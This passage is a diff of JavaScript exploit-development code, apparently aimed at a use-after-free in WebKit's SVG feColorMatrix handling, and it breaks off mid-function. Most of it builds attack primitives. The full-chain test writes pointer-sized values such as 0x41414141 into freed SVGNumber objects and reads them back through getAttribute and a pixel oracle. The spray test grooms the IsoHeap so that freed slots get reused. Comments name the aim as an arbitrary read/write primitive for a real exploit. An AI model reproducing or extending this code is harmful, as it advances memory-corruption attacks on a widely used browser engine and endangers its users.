-    fillG = fillG !== undefined ? fillG : 100;
-    fillB = fillB !== undefined ? fillB : 50;
-    var mv = [a,0,0,0,0, 0,b,0,0,0, 0,0,c,0,0, 0,0,0,1,0];
-    var px = await svgPixel(svgStrFromMatrix(mv, fillR, fillG, fillB));
-    return px;
+    var mv20 = [mv,0,0,0,0, 0,mv,0,0,0, 0,0,mv,0,0, 0,0,0,1,0];
+    return svgPixel(svgStrFromMatrix(mv20, fillR, fillG, fillB));
   }
 
-  // Test A: diagonal calibration
-  log('  TestA: diagonal calibration R=200 G=100 B=50', 'inf');
-  var aVals = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 20, 50, 100, 128, 200, 255, 256, 1000, 4352, 4353, 4354];
-  for (var ai = 0; ai < aVals.length; ai++) {
-    var av = aVals[ai];
-    var px = await diagQuery(av, av, av);
-    var rExp = (Math.round(av * 200)) & 0xFF;
-    var gExp = (Math.round(av * 100)) & 0xFF;
-    var bExp = (Math.round(av * 50)) & 0xFF;
-    var match = px && (Math.abs(px[0]-rExp)<2) && (Math.abs(px[1]-gExp)<2) && (Math.abs(px[2]-bExp)<2);
-    log('  a=b=c=' + av + ': px=' + (px ? px.slice(0,3) : 'err') +
-        ' model=(' + rExp + ',' + gExp + ',' + bExp + ')' + (match ? ' MATCH' : ' MISMATCH'),
+  // Test A: src_R sweep at mv=0.5 — find working source values
+  log('  TestA: mv=0.5 source sweep (expect R = floor(0.5*src_R))', 'inf');
+  var srcVals = [1,2,3,4,5,6,7,8,10,16,32,50,64,100,127,128,170,200,254,255];
+  for (var si = 0; si < srcVals.length; si++) {
+    var src = srcVals[si];
+    var px = await diagQ(0.5, src);
+    var expected = Math.floor(0.5 * src);
+    log('  mv=0.5 src_R=' + src + ': R=' + (px ? px[0] : 'err') +
+        ' expected_floor=' + expected + ' expected_round=' + Math.round(0.5*src),
+        px && Math.abs(px[0] - expected) <= 1 ? 'ok' : 'bad');
+  }
+
+  // Test B: mv=0.1 source sweep
+  log('  TestB: mv=0.1 source sweep (expect R = floor(0.1*src_R))', 'inf');
+  for (var si = 0; si < srcVals.length; si++) {
+    var src = srcVals[si];
+    var px = await diagQ(0.1, src);
+    var expected = Math.floor(0.1 * src);
+    log('  mv=0.1 src_R=' + src + ': R=' + (px ? px[0] : 'err') + ' expected=' + expected,
+        px && Math.abs(px[0] - expected) <= 1 ? 'ok' : 'bad');
+  }
+
+  // Test C: for mv >= 1, find src_R that doesn't saturate
+  log('  TestC: saturation threshold (find src_R where mv*src_R < 255)', 'inf');
+  var mvVals = [1.5, 2, 3, 10, 100, 1000];
+  var safeSrc = [1, 2, 10, 50, 100, 127, 170, 200, 254, 255];
+  for (var mi = 0; mi < mvVals.length; mi++) {
+    var mv = mvVals[mi];
+    for (var si = 0; si < safeSrc.length; si++) {
+      var src = safeSrc[si];
+      var px = await diagQ(mv, src);
+      log('  mv=' + mv + ' src_R=' + src + ': R=' + (px ? px[0] : 'err') +
+          ' sat=' + (px && px[0] === 255 ? 'YES' : 'no'),
+          'dim');
+    }
+  }
+
+  // Test D: why does src_R=1 give R=0 for all mv?
+  // Key question: is src_R=1 being treated as 0 internally?
+  // Test: at mv=0.5, src_R=1 gives R=? The expected value is floor(0.5*1)=0 → that's CORRECT
+  // Then: at mv=200, src_R=1 gives R=? Expected=floor(200*1)=200 (if no normalization)
+  // But we saw R=0 for mv=137 src_R=1. Let's sweep mv at src_R=1.
+  log('  TestD: src_R=1 mystery — sweep mv values', 'inf');
+  var mvTest1 = [0, 0.5, 0.99, 1, 1.5, 2, 10, 100, 127, 128, 129, 130, 255, 256, 1000];
+  for (var mi = 0; mi < mvTest1.length; mi++) {
+    var mv = mvTest1[mi];
+    var px = await diagQ(mv, 1);
+    log('  mv=' + mv + ' src_R=1: R=' + (px ? px[0] : 'err'), 'inf');
+  }
+
+  // Test E: full (mv, src_R) grid
+  log('  TestE: 2D grid (mv x src_R)', 'inf');
+  var gridMv = [0.1, 0.5, 1.0, 1.5, 2.0, 10.0, 100.0];
+  var gridSrc = [1, 10, 50, 100, 200];
+  for (var mi = 0; mi < gridMv.length; mi++) {
+    var mv = gridMv[mi];
+    var row = 'mv=' + mv + ':';
+    for (var si = 0; si < gridSrc.length; si++) {
+      var src = gridSrc[si];
+      var px = await diagQ(mv, src);
+      row += ' src' + src + '=' + (px ? px[0] : '?');
+    }
+    log('  ' + row, 'inf');
+  }
+
+  if (!q) dis(false);
+}
+
+/*
+ * FCH: Full Chain
+ *
+ * Goal: demonstrate a working arbitrary-float R/W primitive with read oracle.
+ *
+ * The chain:
+ * 1. Create feColorMatrix (matrix type, identity)
+ * 2. Attach to live DOM, wait for layout
+ * 3. Store reference to values: saved = fcm.values
+ * 4. Remove from DOM: fcm.remove()  ← SVGNumber objects are now freed
+ * 5. Write arbitrary float X via: saved.baseVal[idx].value = X
+ * 6. Re-add to DOM: filter.appendChild(fcm)
+ * 7. Read back via getAttribute: readback = fcm.getAttribute("values").split(" ")[idx]
+ *    OR via: readback = fcm.values.baseVal[idx].value
+ * 8. Confirm readback === X (or close enough)
+ * 9. BONUS: if we can also render a pixel for the written value, use ORM-calibrated oracle
+ *
+ * Key: demonstrate this works for values that would be useful in a real exploit:
+ * - Large integers (pointer-sized: 0x41414141, 0x7fff1234)
+ * - Negative floats (-1.0, -0.5)
+ * - Very precise floats (e.g. addresses expressed as floats)
+ * - All 20 slots simultaneously
+ *
+ * Also: chain UAF write into pixel oracle (where model is calibrated).
+ * For mv in [0, 2.0] range, use src_R=100 (non-saturating since 2*100=200<255).
+ * Use the getAttribute oracle for values outside this range.
+ */
+async function runFCH(q) {
+  if (!q) { dis(true); sep(); log('FCH: full chain', 'inf'); sep(); }
+
+  // Helper: full UAF chain for index idx, value val
+  async function uafChain(idx, val, name) {
+    var d = makeFCM(identity20());
+    await raf(); await raf();
+    var saved = d.fcm.values;
+    d.fcm.remove(); await raf();
+    var wrote = null;
+    try {
+      saved.baseVal[idx].value = val;
+      wrote = saved.baseVal[idx].value;
+    } catch(e) { wrote = 'ERR:' + e.message; }
+    d.filter.appendChild(d.fcm); await raf();
+    var attrStr = d.fcm.getAttribute('values');
+    var attrParts = attrStr ? attrStr.trim().split(/\s+/) : [];
+    var attrVal = attrParts[idx] !== undefined ? parseFloat(attrParts[idx]) : NaN;
+    var bvVal = null;
+    try { bvVal = d.fcm.values.baseVal[idx].value; } catch(e) {}
+    cleanup(d);
+    return { wrote: wrote, attr: attrParts[idx], attrNum: attrVal, bv: bvVal };
+  }
+
+  // Test A: pointer-like integer values
+  log('  TestA: pointer-sized integers via UAF', 'inf');
+  var ptrVals = [
+    { v: 0x41414141, name: 'AAAA (0x41414141)' },
+    { v: 0x7fff1234, name: '0x7fff1234' },
+    { v: 0xdeadbeef, name: '0xdeadbeef' },
+    { v: 0x100000000, name: '0x100000000 (4GB)' },
+    { v: 0x7fffffffffff, name: '0x7fffffffffff (48-bit)' },
+    { v: 0xffffffffffff, name: '0xffffffffffff' }
+  ];
+  for (var pi = 0; pi < ptrVals.length; pi++) {
+    var pv = ptrVals[pi];
+    var r = await uafChain(0, pv.v, pv.name);
+    var match = !isNaN(r.attrNum) && Math.abs(r.attrNum - pv.v) / pv.v < 1e-6;
+    log('  ' + pv.name + ': wrote=' + r.wrote + ' attr="' + r.attr + '"' +
+        ' bv=' + r.bv + (match ? ' EXACT' : ' DELTA=' + Math.abs(r.attrNum - pv.v)),
         match ? 'ok' : 'bad');
   }
 
-  // Test B: src_R=1 sweep — direct integer read
-  log('  TestB: src_R=1 oracle (R_out = floor(mv) mod 256)', 'inf');
-  var mvBVals = [0, 1, 2, 127, 128, 255, 256, 257, 511, 512, 1000, 1001, 65535, 65536, 131072];
-  for (var bi = 0; bi < mvBVals.length; bi++) {
-    var bv = mvBVals[bi];
-    var pxB = await diagQuery(bv, 0, 0, 1, 0, 0);
-    var rExpB = Math.round(bv * 1) & 0xFF;
-    log('  mv=' + bv + ' src_R=1: R=' + (pxB ? pxB[0] : 'err') + ' model=' + rExpB,
-        pxB && Math.abs(pxB[0]-rExpB)<2 ? 'ok' : 'bad');
+  // Test B: negative floats
+  log('  TestB: negative float UAF write + getAttribute', 'inf');
+  var negVals = [-0.5, -1.0, -2.0, -100.0, -1234.5678, -3.4e38, -1e-38];
+  for (var ni = 0; ni < negVals.length; ni++) {
+    var nv = negVals[ni];
+    var r = await uafChain(0, nv, '');
+    var match = !isNaN(r.attrNum) && Math.abs(r.attrNum - nv) / (Math.abs(nv) + 1e-20) < 1e-5;
+    log('  wrote=' + nv + ' attr="' + r.attr + '"' +
+        (match ? ' MATCH' : ' MISMATCH(delta=' + (r.attrNum - nv) + ')'),
+        match ? 'ok' : 'bad');
   }
 
-  // Test C: simulated unknown recovery
-  log('  TestC: unknown float recovery (mv=137 secret)', 'inf');
+  // Test C: all 20 slots simultaneously with pointer-like values
+  log('  TestC: all 20 slots simultaneously (pattern write + getAttribute readback)', 'inf');
   {
-    var SECRET = 137;
-    // Query 1: src_R=1 → floor(137*1)&0xFF = 137
-    var q1 = await diagQuery(SECRET, 0, 0, 1, 0, 0);
-    log('  src_R=1: R=' + (q1 ? q1[0] : 'err') + ' (expect 137)', q1 && q1[0]===137 ? 'ok' : 'bad');
-    // Query 2: src_R=200 → (137*200)&0xFF = 27400&0xFF = 27400-107*256=27400-27392=8
-    var q2 = await diagQuery(SECRET, 0, 0, 200, 0, 0);
-    var rExpC2 = (137*200)&0xFF;
-    log('  src_R=200: R=' + (q2 ? q2[0] : 'err') + ' (expect ' + rExpC2 + ')', q2 && q2[0]===rExpC2 ? 'ok' : 'bad');
-    // Query 3: src_R=255 → (137*255)&0xFF = 34935&0xFF = 34935-136*256=34935-34816=119
-    var q3 = await diagQuery(SECRET, 0, 0, 255, 0, 0);
-    var rExpC3 = (137*255)&0xFF;
-    log('  src_R=255: R=' + (q3 ? q3[0] : 'err') + ' (expect ' + rExpC3 + ')', q3 && q3[0]===rExpC3 ? 'ok' : 'bad');
-    // Recovery from q1 alone: candidate = R_out = 137 → ambiguous (could be any 137+k*256)
-    // With q2: narrow to: x*200 ≡ 8 (mod 256), x ≡ 137 (mod 256)
-    // CRT: x mod lcm(256, 256) = combine
-    log('  Recovery: q1 gives x≡' + (q1?q1[0]:'?') + '(mod 256), q2 gives x*200≡' + (q2?q2[0]:'?') + '(mod 256)', 'inf');
-    log('  If both match model: SECRET=' + SECRET + ' recovered uniquely mod 256 from q1 alone', 'inf');
+    var d = makeFCM(identity20());
+    await raf(); await raf();
+    var saved = d.fcm.values;
+    d.fcm.remove(); await raf();
+    // Write unique recognizable values to all 20 slots
+    var pattern = [];
+    for (var i = 0; i < 20; i++) {
+      var v = 1000000 + i * 111111;
+      pattern.push(v);
+      try { saved.baseVal[i].value = v; } catch(e) {}
+    }
+    d.filter.appendChild(d.fcm); await raf();
+    var attrC = d.fcm.getAttribute('values');
+    var partsC = attrC ? attrC.trim().split(/\s+/).map(parseFloat) : [];
+    var hitC = 0;
+    for (var i = 0; i < 20; i++) {
+      if (partsC[i] !== undefined && Math.abs(partsC[i] - pattern[i]) / pattern[i] < 1e-4) hitC++;
+    }
+    log('  ' + hitC + '/20 pattern values match in getAttribute', hitC >= 18 ? 'ok' : 'bad');
+    log('  wrote:    ' + pattern.slice(0,5).join(' ') + ' ...', 'dim');
+    log('  readback: ' + partsC.slice(0,5).join(' ') + ' ...', 'dim');
+    cleanup(d);
   }
 
-  // Test D: multi-channel simultaneous — recover 3 unknowns from one render
-  log('  TestD: 3-channel simultaneous oracle (a=137, b=73, c=211)', 'inf');
-  {
-    var SA = 137, SB = 73, SC = 211;
-    var pxD = await diagQuery(SA, SB, SC, 1, 1, 1);
-    log('  src=(1,1,1): px=' + (pxD ? pxD.slice(0,3) : 'err') +
-        ' model=(' + (SA&0xFF) + ',' + (SB&0xFF) + ',' + (SC&0xFF) + ')',
-        pxD && pxD[0]===(SA&0xFF) && pxD[1]===(SB&0xFF) && pxD[2]===(SC&0xFF) ? 'ok' : 'bad');
-    // 3 unknowns recovered in ONE render call
-    log('  one render gives 3 channel values: R=' + (pxD?pxD[0]:'?') + ' G=' + (pxD?pxD[1]:'?') + ' B=' + (pxD?pxD[2]:'?'), 'inf');
-  }
-
-  // Test E: negative matrix values
-  log('  TestE: negative matrix values (saturation test)', 'inf');
-  var negVals = [-1, -2, -10, -100, -127, -128, -255, -256, -1000];
-  for (var ei = 0; ei < negVals.length; ei++) {
-    var ev = negVals[ei];
-    var pxE = await diagQuery(ev, 0, 0, 200, 0, 0);
-    var rExpE = ((ev * 200) % 256 + 256) % 256; // handle negative mod
-    log('  mv=' + ev + ' src_R=200: R=' + (pxE ? pxE[0] : 'err') + ' model_wrap=' + rExpE,
-        'dim');
-  }
-
-  // Test F: fractional matrix values
-  log('  TestF: fractional values (sub-1.0 range)', 'inf');
-  var fracVals = [0.001, 0.01, 0.1, 0.25, 0.5, 0.75, 0.9, 0.99, 1.0, 1.001, 1.01, 1.1, 1.5, 1.99];
-  for (var fi = 0; fi < fracVals.length; fi++) {
-    var fv = fracVals[fi];
-    var pxF = await diagQuery(fv, 0, 0, 200, 0, 0);
-    var rExpF = Math.floor(fv * 200) & 0xFF;
-    log('  mv=' + fv + ' src_R=200: R=' + (pxF ? pxF[0] : 'err') + ' floor_model=' + rExpF,
-        pxF && Math.abs(pxF[0] - rExpF) <= 1 ? 'ok' : 'bad');
+  // Test D: UAF write + pixel oracle (using src_R=10 for non-saturating range)
+  // If ORM TestA shows src_R=10 works: mv=0.5 → R=5 (non-saturating)
+  // Then for UAF-written mv in [0, 25.5], use src_R=10 to get R = mv*10 ∈ [0,255]
+  log('  TestD: UAF write + pixel oracle (src_R=10, mv range [0,25.5])', 'inf');
+  var oracleVals = [0, 0.1, 0.5, 1.0, 2.5, 5.0, 10.0, 15.0, 20.0, 25.0, 25.4, 25.5, 26.0];
+  for (var oi = 0; oi < oracleVals.length; oi++) {
+    var ov = oracleVals[oi];
+    // Write via UAF, read via pixel
+    var d = makeFCM(identity20());
+    await raf(); await raf();
+    var savedD = d.fcm.values;
+    d.fcm.remove(); await raf();
+    try { savedD.baseVal[0].value = ov; } catch(e) {}
+    d.filter.appendChild(d.fcm); await raf();
+    // Read back getAttribute
+    var readAttr = d.fcm.getAttribute('values');
+    var partsD = readAttr ? readAttr.trim().split(/\s+/).map(parseFloat) : [];
+    var mvFromAttr = partsD[0];
+    cleanup(d);
+    // Now render static SVG with the read-back value
+    var mv20D = identity20();
+    mv20D[0] = typeof mvFromAttr === 'number' ? mvFromAttr : ov;
+    var pxD = await svgPixel(svgStrFromMatrix(mv20D, 10, 0, 0));
+    var expectedD = Math.min(255, Math.round(ov * 10));
+    log('  UAF mv=' + ov + ' attr=' + mvFromAttr + ' px_R=' + (pxD ? pxD[0] : 'err') +
+        ' expected_10x=' + expectedD,
+        pxD && Math.abs(pxD[0] - expectedD) <= 1 ? 'ok' : 'bad');
   }
 
   if (!q) dis(false);
 }
 
 /*
- * URT: UAF Round-Trip
+ * SPR: Spray + UAF
  *
- * v33 finding: readLive() always returns 0,0,0 (XMLSerializer broken).
- * BUT: StratH in RLF shows we can read baseVal values back from a live DOM element
- * using the JS API (baseVal[i].value), then feed those values into svgPixel().
- *
- * UAF Round-Trip strategy:
- * 1. Create feColorMatrix, attach, render
- * 2. Remove (free the C++ SVGNumber objects)
- * 3. Write via UAF: fcm.values.baseVal[0].value = X
- * 4. The write succeeded (v32 confirmed: wrote=X)
- * 5. Re-add to DOM
- * 6. Read back via baseVal: fcm.values.baseVal[0].value
- * 7. Construct static SVG string with read-back values
- * 8. Render via svgPixel()
- * 9. COMPARE: does the pixel match the expected output for X?
- *
- * If yes: UAF write is confirmed end-to-end.
- * If readback gives X but pixel gives wrong value: the write corrupts something else.
- * If readback gives something OTHER than X: the UAF write landed somewhere else.
- *
- * Also test:
- * - Write to multiple indices simultaneously
- * - Write a large value (like 4354 which gives R=255) and verify R=255
- * - Write 0 to a diagonal element and verify R=0
- * - Write a specific value that gives a KNOWN pixel color
- *
- * KEY: we use svgPixel(staticStr) NOT readLive(). The static path works.
- * The round-trip is: UAF write -> DOM readback -> static render -> pixel verify.
- */
-async function runURT(q) {
-  if (!q) { dis(true); sep(); log('URT: UAF round-trip proof', 'inf'); sep(); }
-
-  var SVG_NS = 'http://www.w3.org/2000/svg';
-
-  function makeFCM(vals) {
-    var outerSvg = document.createElementNS(SVG_NS, 'svg');
-    outerSvg.setAttribute('width', '300'); outerSvg.setAttribute('height', '300');
-    outerSvg.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0;pointer-events:none';
-    var defs = document.createElementNS(SVG_NS, 'defs');
-    var filter = document.createElementNS(SVG_NS, 'filter');
-    var fid = 'fURT' + Math.random().toString(36).slice(2);
-    filter.setAttribute('id', fid); filter.setAttribute('color-interpolation-filters', 'sRGB');
-    var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
-    fcm.setAttribute('type', 'matrix');
-    fcm.setAttribute('values', vals.join(' '));
-    filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
-    var rect = document.createElementNS(SVG_NS, 'rect');
-    rect.setAttribute('x', '50'); rect.setAttribute('y', '50');
-    rect.setAttribute('width', '200'); rect.setAttribute('height', '200');
-    rect.setAttribute('fill', 'rgb(200,100,50)');
-    rect.setAttribute('filter', 'url(#' + fid + ')');
-    outerSvg.appendChild(rect);
-    return { svg: outerSvg, fcm: fcm, filter: filter };
-  }
-
-  async function readBaseVal(fcm, len) {
-    var out = [];
-    try {
-      var bv = fcm.values.baseVal;
-      for (var i = 0; i < len; i++) out.push(bv[i].value);
-    } catch(e) { out.push('ERR'); }
-    return out;
-  }
-
-  async function renderFromBaseVal(fcm, len, fillR, fillG, fillB) {
-    var vals = await readBaseVal(fcm, len);
-    if (vals.some(function(v){return typeof v !== 'number';})) return null;
-    while (vals.length < 20) vals.push(0);
-    return svgPixel(svgStrFromMatrix(vals, fillR, fillG, fillB));
-  }
-
-  // Test 1: baseline — write while LIVE, readback, render
-  log('  Test1: LIVE write (no UAF), readback, static render', 'inf');
-  {
-    var d1 = makeFCM(identity20());
-    document.body.appendChild(d1.svg); await raf(); await raf();
-    var bef1 = await readBaseVal(d1.fcm, 20);
-    log('  before: [0]=' + bef1[0] + ' [5]=' + bef1[5] + ' [10]=' + bef1[10], 'dim');
-    // Write via live baseVal
-    try {
-      d1.fcm.values.baseVal[0].value = 2;
-      d1.fcm.values.baseVal[6].value = 1.5;
-      d1.fcm.values.baseVal[12].value = 3;
-    } catch(e) {}
-    var aft1 = await readBaseVal(d1.fcm, 20);
-    log('  after live write: [0]=' + aft1[0] + ' [6]=' + aft1[6] + ' [12]=' + aft1[12],
-        'inf');
-    var px1 = await renderFromBaseVal(d1.fcm, 20, 200, 100, 50);
-    // Expected: R = (2*200)&0xFF = 144, G = (1.5*100)&0xFF = 150, B = (3*50)&0xFF = 150
-    var rExp1 = (2*200)&0xFF, gExp1 = Math.round(1.5*100)&0xFF, bExp1 = (3*50)&0xFF;
-    log('  static render from live-written values: px=' + (px1 ? px1.slice(0,3) : 'err') +
-        ' expected=(' + rExp1 + ',' + gExp1 + ',' + bExp1 + ')',
-        px1 && Math.abs(px1[0]-rExp1)<2 && Math.abs(px1[1]-gExp1)<2 ? 'ok' : 'bad');
-    document.body.removeChild(d1.svg);
-  }
-
-  // Test 2: UAF write, readback, static render — THE CORE TEST
-  log('  Test2: UAF write (after remove), readback, static render', 'inf');
-  {
-    var testCases = [
-      { idx: 0, val: 2,    desc: 'R-diag=2 (R_out=144=2*200&0xFF)' },
-      { idx: 0, val: 4354, desc: 'R-diag=4354 (R_out=255? confirm from F16 TestA)' },
-      { idx: 0, val: 1.5,  desc: 'R-diag=1.5 (R_out=(300)&0xFF=44)' },
-      { idx: 0, val: 100,  desc: 'R-diag=100 (R_out=(20000)&0xFF=32)' },
-      { idx: 6, val: 2,    desc: 'G-diag=2 (G_out=(200)&0xFF=200)' },
-      { idx: 12,val: 2,    desc: 'B-diag=2 (B_out=(100)&0xFF=100)' }
-    ];
-
-    for (var ti = 0; ti < testCases.length; ti++) {
-      var tc = testCases[ti];
-      var initVals = identity20();
-      var d2 = makeFCM(initVals);
-      document.body.appendChild(d2.svg); await raf(); await raf();
-
-      // UAF: remove, then write
-      var saved = d2.fcm.values;
-      d2.fcm.remove(); await raf();
-      var wroteVal = null;
-      try {
-        saved.baseVal[tc.idx].value = tc.val;
-        wroteVal = saved.baseVal[tc.idx].value;
-      } catch(e) { wroteVal = 'ERR:' + e; }
-
-      // Re-add (even though render is broken, we want to read back via baseVal)
-      d2.filter.appendChild(d2.fcm); await raf();
-
-      // Readback
-      var readVals = await readBaseVal(d2.fcm, 20);
-      var readIdx = readVals[tc.idx];
-
-      // Static render
-      var fullVals = identity20();
-      fullVals[tc.idx] = typeof readIdx === 'number' ? readIdx : tc.val;
-      var pxStr = svgStrFromMatrix(fullVals, 200, 100, 50);
-      var px2 = await svgPixel(pxStr);
-
-      // Expected
-      var expR = tc.idx === 0 ? (Math.round(fullVals[0]*200)&0xFF) :
-                 (Math.round(1*200)&0xFF);
-      var expG = tc.idx === 6 ? (Math.round(fullVals[6]*100)&0xFF) :
-                 (Math.round(1*100)&0xFF);
-      var expB = tc.idx === 12 ? (Math.round(fullVals[12]*50)&0xFF) :
-                 (Math.round(1*50)&0xFF);
-
-      log('  [' + tc.idx + ']=' + tc.val + ' (' + tc.desc + ')', 'inf');
-      log('    wrote=' + wroteVal + ' readback=' + readIdx, 'dim');
-      log('    static px=' + (px2 ? px2.slice(0,3) : 'err') +
-          ' expected~(' + expR + ',' + expG + ',' + expB + ')',
-          px2 && Math.abs(px2[0]-expR)<3 ? 'ok' : 'bad');
-
-      document.body.removeChild(d2.svg);
-    }
-  }
-
-  // Test 3: all 20 indices — map which ones survive UAF
-  log('  Test3: UAF write to all 20 indices, readback verification', 'inf');
-  {
-    var initV3 = identity20();
-    var d3 = makeFCM(initV3);
-    document.body.appendChild(d3.svg); await raf(); await raf();
-    var saved3 = d3.fcm.values;
-    d3.fcm.remove(); await raf();
-
-    // Write all 20 to a known pattern: idx+1
-    var writeRes = [];
-    for (var wi = 0; wi < 20; wi++) {
-      try {
-        saved3.baseVal[wi].value = wi + 1;
-        writeRes.push(saved3.baseVal[wi].value);
-      } catch(e) { writeRes.push('ERR'); }
-    }
-
-    d3.filter.appendChild(d3.fcm); await raf();
-
-    // Readback all 20
-    var readRes3 = await readBaseVal(d3.fcm, 20);
-    log('  wrote:    ' + writeRes.slice(0,10).join(' '), 'dim');
-    log('  readback: ' + readRes3.slice(0,10).join(' '), 'dim');
-
-    // Check which survived
-    var survived = 0;
-    for (var si = 0; si < 20; si++) {
-      if (Math.abs(readRes3[si] - (si+1)) < 0.001) survived++;
-    }
-    log('  ' + survived + '/20 UAF writes survived in readback', survived === 20 ? 'ok' : 'bad');
-
-    // Static render with the readback values
-    var px3 = await svgPixel(svgStrFromMatrix(readRes3.map(function(v){
-      return typeof v === 'number' ? v : 0;
-    }), 200, 100, 50));
-    log('  static render with UAF-written values: px=' + (px3 ? px3.slice(0,3) : 'err'), 'inf');
-
-    document.body.removeChild(d3.svg);
-  }
-
-  if (!q) dis(false);
-}
-
-/*
- * TSG: Type-Swap getAttribute
- *
- * v33 TSH finding: OOB JS index returns null (bounds-checked).
- * But we never tried getAttribute() AFTER a type swap.
- *
- * WebKit SVG has two value representations:
- * - The "content attribute" (the string in the DOM, what getAttribute returns)
- * - The "presentation value" (the C++ computed value list)
- *
- * After a type-swap via setAttribute("type", "matrix"):
- * - The C++ m_values vector may have 1 element (from hueRotate)
- * - But if we call getAttribute("values"), what string does WebKit return?
- *   Option A: the ORIGINAL string (the old "hueRotate" values string = "180")
- *   Option B: the new string serialized from the C++ vector (= just "180")
- *   Option C: a new full 20-value string expanded from the C++ state
- *   Option D: nothing / empty
- *
- * If option C: we get the 19 uninitialized C++ floats as a string!
- * These would be whatever was in the IsoHeap slot at allocation time.
+ * v34 confirmed: Float32Array spray doesn't hit SVGNumber IsoHeap.
+ * Need to spray using SVGNumber-type objects.
+ * Strategy: create many feColorMatrix elements (each creates 20 SVGNumber objects),
+ * free them in a specific order, then trigger UAF.
+ * If our UAF free slot is reused by a fresh alloc, we control what ends up there.
  *
  * Tests:
- * A) hueRotate(180) -> setAttribute("type","matrix") -> getAttribute("values")
- * B) Same but add setAttribute("values","") after type-swap to force re-serialization
- * C) Create with type=matrix 20 values, swap to hueRotate, swap back to matrix
- *    Does the original 20 values return, or do we get the 1-element C++ state?
- * D) Spray specific values before the type-swap
- *    If heap contains our values, getAttribute would expose them
- * E) Read baseVal after type-swap — v33 showed length=1, OOB=null
- *    But what about item(0) explicitly? Does it give the hueAngle?
- *    What about the VALUES attribute string?
+ * A) Spray N feColorMatrix hueRotate elements (1 SVGNumber each), free them,
+ *    create UAF target. Does UAF target land in a freed slot?
+ *    Detect: write unique value to spray elements before freeing,
+ *    UAF write a different unique value,
+ *    check: does getAttribute show the UAF value or the spray value?
+ *
+ * B) Spray N feColorMatrix matrix elements (20 SVGNumber each), free N-1,
+ *    trigger UAF on the Nth. What does getAttribute show for slots beyond [0]?
+ *    If those slots now contain adjacent alloc data → info leak?
+ *
+ * C) Grooming: alloc A, alloc B, free A, alloc C (same size as A), free B.
+ *    Does C land where A was? Or does IsoHeap reuse order differ?
+ *    Test: each SVGNumber in a feColorMatrix is a separate IsoHeap alloc.
+ *    Create 100 feColorMatrix matrix elements (2000 SVGNumber allocs),
+ *    free 50 of them (1000 frees), create new target.
+ *    Measure: does target's alloc land in predictable position?
+ *
+ * D) Lifetime extension: keep reference to fcm.values after fcm.remove().
+ *    How long does the freed memory stay stable?
+ *    Test: remove, wait N rAF frames, then write. Does write still succeed?
  */
-async function runTSG(q) {
-  if (!q) { dis(true); sep(); log('TSG: type-swap getAttribute', 'inf'); sep(); }
+async function runSPR(q) {
+  if (!q) { dis(true); sep(); log('SPR: spray + UAF', 'inf'); sep(); }
 
-  // Test A: basic type-swap getAttribute
-  log('  TestA: hueRotate->matrix getAttribute("values")', 'inf');
+  // Test A: spray with feColorMatrix hueRotate (1 SVGNumber each), free, UAF
+  log('  TestA: spray hueRotate (1 SVGNumber each), free, UAF', 'inf');
   {
-    var eA = document.createElementNS(SVG_NS, 'feColorMatrix');
-    eA.setAttribute('type', 'hueRotate'); eA.setAttribute('values', '180');
-    var filterA = document.createElementNS(SVG_NS, 'filter');
-    filterA.setAttribute('id', 'fTSGA');
-    filterA.appendChild(eA);
+    var SPRAY_A = 200;
+    var SPRAY_VAL = 77.77;
+    var spray = [];
+    // Create spray elements (not attached to DOM — they still alloc SVGNumber internally?)
+    // Actually: SVGNumber objects are allocated when baseVal is accessed or when
+    // the element is parsed with values. Let's attach them to a live DOM filter.
+    var sprayContainer = document.createElementNS(SVG_NS, 'svg');
+    sprayContainer.setAttribute('width', '1'); sprayContainer.setAttribute('height', '1');
+    sprayContainer.style.cssText = 'position:fixed;top:-999px;left:-999px;opacity:0';
+    var sprayDefs = document.createElementNS(SVG_NS, 'defs');
+    sprayContainer.appendChild(sprayDefs);
+    document.body.appendChild(sprayContainer);
+
+    for (var si = 0; si < SPRAY_A; si++) {
+      var filt = document.createElementNS(SVG_NS, 'filter');
+      filt.setAttribute('id', 'spf' + si);
+      var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
+      fcm.setAttribute('type', 'hueRotate');
+      fcm.setAttribute('values', String(SPRAY_VAL));
+      filt.appendChild(fcm);
+      sprayDefs.appendChild(filt);
+      spray.push({ filt: filt, fcm: fcm });
+    }
+    await raf(); await raf();
+
+    // Free all spray elements
+    for (var si = 0; si < spray.length; si++) {
+      sprayDefs.removeChild(spray[si].filt);
+    }
+    spray = null;
+    await raf(); await raf();
+
+    // Now create UAF target
+    var dA = makeFCM(identity20());
+    await raf(); await raf();
+    var savedA = dA.fcm.values;
+    dA.fcm.remove(); await raf();
+    try { savedA.baseVal[0].value = 99.99; } catch(e) {}
+    dA.filter.appendChild(dA.fcm); await raf();
+    var attrA = dA.fcm.getAttribute('values');
+    var partsA = attrA ? attrA.trim().split(/\s+/).map(parseFloat) : [];
+    log('  after spray free + UAF: getAttribute[0]=' + partsA[0] +
+        ' (UAF value: 99.99, spray value: 77.77)', 'inf');
+    log('  UAF value won: ' + (Math.abs(partsA[0] - 99.99) < 0.01), 'ok');
+    document.body.removeChild(sprayContainer);
+    cleanup(dA);
+  }
+
+  // Test B: spray matrix (20 SVGNumber each), check adjacent slots after UAF
+  log('  TestB: spray matrix (20 SVGNumber each), UAF, inspect all 20 slots', 'inf');
+  {
+    var SPRAY_B = 100;
+    var sprayB = [];
+    // Spray and immediately write recognizable values
+    for (var si = 0; si < SPRAY_B; si++) {
+      var db = makeFCM(identity20());
+      // Write pattern: slot i = si * 100 + i
+      for (var j = 0; j < 20; j++) {
+        try { db.fcm.values.baseVal[j].value = si * 100 + j; } catch(e) {}
+      }
+      sprayB.push(db);
+    }
+    await raf(); await raf();
+
+    // Free all spray
+    for (var si = 0; si < sprayB.length; si++) { cleanup(sprayB[si]); }
+    sprayB = null;
+    await raf(); await raf();
+
+    // UAF target
+    var dB = makeFCM(identity20());
+    await raf(); await raf();
+    var savedB = dB.fcm.values;
+    dB.fcm.remove(); await raf();
+    // Write only index 0
+    try { savedB.baseVal[0].value = 42; } catch(e) {}
+    dB.filter.appendChild(dB.fcm); await raf();
+
+    var attrB = dB.fcm.getAttribute('values');
+    var partsB = attrB ? attrB.trim().split(/\s+/).map(parseFloat) : [];
+    log('  UAF target [0]=42, adjacent slots:', 'inf');
